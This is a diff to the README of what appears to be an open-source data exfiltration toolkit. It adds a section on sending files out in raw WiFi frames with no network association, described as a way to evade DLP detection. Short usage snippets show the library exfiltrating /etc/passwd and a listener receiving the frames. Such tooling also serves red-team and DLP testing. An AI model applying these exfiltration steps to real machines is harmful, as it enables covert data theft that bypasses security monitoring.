@@ -19,6 +19,7 @@ This started as a PoC project but has later turned into something a bit more. Cu
 * Physical
   * Audio
   * QR Codes
+  * WiFi - On Payload
 * Steganography
   * Binary Offset
   * Video Transcript to Dictionary
@@ -41,7 +42,7 @@ It was written under MacOS so for any bugs please report to us so that we can fi
 ```bash
 brew tap homebrew/science
 brew install opencv
-pip install --user -r pyexfil/physical/qw/requirements.txt
+pip install --user -r pyexfil/physical/qr/requirements.txt
 ```
 
 #### To QR Codes
@@ -68,6 +69,24 @@ if __name__ == "__main__":
     startFlow(mode=CAM_MODE) # will use data from camera
 
 ```
+
+### WiFi - On Payload
+This technique is especially efficient when you have some physical proximity to the machine that will exfiltrate the data and for large data sets. The idea behind this is to create Dot11 frames without any network assosiation and sending them out. Any DLP device should not detect this as there is no 'real' network connectivity. There is no handshake, assosiation or any other indication that the machine is communicating over WiFi other than the NIC sending packets. This method can exfiltrate large data sets due to these conditions but required physical proximity to intercept the packets. Please bear in mind that we have built no quality compensation mechanism. Therefore, a single dropped packet and the data is lost. As always, we endorse anyone to add QA features to this technique and make it more operationally sound.
+
+#### Exfiltration
+```python
+from pyexfil.physical.wifiPayload import client
+
+client.exfiltrate(file_path="/etc/passwd", key="shut_the_fuck_up_donnie!")
+```
+
+#### Interception
+```python
+from pyexfil.physical.wifiPayload import server
+
+server.StartListening(adapter="en0")
+```
+
 
 ## Network Exfiltration
 
